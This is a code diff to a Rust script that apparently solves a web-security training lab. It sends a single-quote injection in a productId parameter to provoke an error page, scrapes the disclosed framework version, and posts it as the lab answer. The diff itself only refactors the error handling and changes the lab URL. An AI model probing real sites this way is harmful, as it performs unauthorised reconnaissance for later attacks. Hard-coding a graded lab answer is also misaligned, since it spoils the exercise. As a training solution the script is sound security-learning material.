@@ -8,7 +8,7 @@
 *
 * Steps: 1. Inject a single queot in the product ID parameter to cause an error
 *        2. Extract the framework name
-*        3. Submit solution
+*        3. Submit the solution
 *
 **********************************************************************************/
 #![allow(unused)]
@@ -29,56 +29,57 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a3600d603f62f3580f894800013003a.web-security-academy.net";
+    let url = "https://0aba00b704c3c1ca81049833002200f5.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    println!("{} {}", "1. Injecting the payload..".white(), "OK".green());
+    println!("{} {}", "⦗1⦘ Injecting the payload..".white(), "OK".green());
 
     // inject the payload
-    let product_req = client.get(format!("{url}/product?productId=4'")).send();
+    let product = client
+        .get(format!("{url}/product?productId=4'"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to fetch the page with injected payload".red()
+        ));
 
-    // if the request is sent successfully
-    if let Ok(res) = product_req {
-        // get the body of the response
-        let body = res.text().unwrap();
+    // get the body of the response
+    let body = product.text().unwrap();
 
-        // extract the framework name; change this if it is changed in your case
-        let framework = extract_pattern("Apache Struts 2 2.3.31", &body);
+    // extract the framework name; change this if it is changed in your case
+    let framework = extract_pattern("Apache Struts 2 2.3.31", &body).expect(&format!(
+        "{}",
+        "[!] Failed to extract the framework name".red()
+    ));
 
-        // if the name is found
-        if let Some(text) = framework {
-            println!(
-                "{} {} => {}",
-                "2. Extracting the framework name..".white(),
-                "OK".green(),
-                text.yellow()
-            );
+    println!(
+        "{} {} => {}",
+        "⦗2⦘ Extracting the framework name..".white(),
+        "OK".green(),
+        framework.yellow()
+    );
 
-            // submit solution
-            let submit_answer = client
-                .post(format!("{url}/submitSolution"))
-                .form(&HashMap::from([("answer", text)]))
-                .send();
+    // submit the solution
+    client
+        .post(format!("{url}/submitSolution"))
+        .form(&HashMap::from([("answer", framework)]))
+        .send()
+        .expect(&format!("{}", "[!] Failed to submit the solution".red()));
 
-            // if submitting is successful
-            if let Ok(res) = submit_answer {
-                println!("{} {}", "3. Submitting solution..".white(), "OK".green());
-                println!(
-                    "{} {}",
-                    "🗹 Check your browser, it should be marked now as"
-                        .white()
-                        .bold(),
-                    "solved".green().bold()
-                )
-            } else {
-                println!("{}", "[!] Failed to submit solution".red())
-            }
-        } else {
-            println!("{}", "[!] No framework names was found".red())
-        }
-    }
+    println!(
+        "{} {}",
+        "⦗3⦘ Submitting the solution..".white(),
+        "OK".green()
+    );
+    println!(
+        "{} {}",
+        "🗹 Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
 }
 
 /*******************************************************************
